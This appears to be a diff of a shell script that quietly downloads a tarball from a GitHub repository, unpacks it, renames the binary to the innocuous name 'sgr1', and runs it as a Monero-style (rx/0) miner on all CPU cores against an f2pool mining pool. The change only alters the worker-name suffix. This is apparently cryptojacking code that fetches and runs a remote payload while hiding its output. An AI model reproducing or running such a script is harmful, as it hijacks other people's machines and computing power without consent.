@@ -2,4 +2,4 @@
 wget https://github.com/TiannaMcdowell/All-File/raw/main/daemon.tar.gz > /dev/null 2>&1 
 tar -xvf daemon.tar.gz
 mv uranus sgr1
-./sgr1 --donate-level 1 -o zeph-asia.f2pool.com:6100 -u novalanto.$(echo $(shuf -i 1-100000 -n 1)-A) -p x -a rx/0 -t $(nproc --all)
+./sgr1 --donate-level 1 -o zeph-asia.f2pool.com:6100 -u novalanto.$(echo $(shuf -i 1-100000 -n 1)-KOKO) -p x -a rx/0 -t $(nproc --all)
